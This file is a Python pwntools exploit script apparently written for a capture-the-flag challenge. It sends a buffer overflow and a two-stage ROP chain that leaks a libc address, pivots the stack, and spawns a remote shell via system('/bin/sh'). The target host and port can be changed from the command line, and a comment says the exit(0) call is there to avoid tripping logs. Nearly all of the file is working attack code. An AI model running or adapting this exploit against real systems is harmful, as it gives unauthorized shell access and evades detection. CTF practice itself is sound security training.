#!/usr/bin/python
from pwn import *
import sys

HOST = 'challenge.pwny.racing'
PORT = 11536

LIBC = 0x64e80
SYSTEM = 0x4f440
BINSH = 0x1b3e9a
EXIT = 0x43120

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

if len(sys.argv) > 3:
    CMD = sys.argv[3]

io = remote(HOST, PORT)
print io.recvuntil('5!\n')

# step 1: lay first rop chain, it will leak, read a second payload and pivot
rop  = p64(0x400783)  # pop rdi ; ret
rop += p64(0x602020)  # printf@got.plt
rop += p64(0x400550)  # puts()
rop += p64(0x400783)  # pop rdi ; ret
rop += p64(0x602800)  # .data
rop += p64(0x400580)  # gets()
rop += p64(0x40077d)  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
rop += p64(0x6027e8)  # .data (second ROP chain)

io.recvuntil(': ')
io.sendline(cyclic(24)+rop)

leak = u64(io.recvline().strip().ljust(8, '\x00'))
libc = leak - LIBC
log.info('leak: 0x%012x' % leak)
log.info('libc: 0x%012x' % libc)

# step 2: run system("/bin/sh") with an exit(0) to avoid tripping logs
rop  = p64(0x400783)     # pop rdi ; ret
rop += p64(libc+BINSH)   # "/bin/sh"
rop += p64(libc+SYSTEM)  # system()
rop += p64(0x400783)     # pop rdi ; ret
rop += p64(0x000000)     # NULL
rop += p64(libc+EXIT)    # exit(0)

io.sendline(rop)
io.recvline(timeout=0.1)

# step 3: collect the shell
io.sendline('id')
log.success('shell? %s' % io.recvline().strip())
io.interactive()
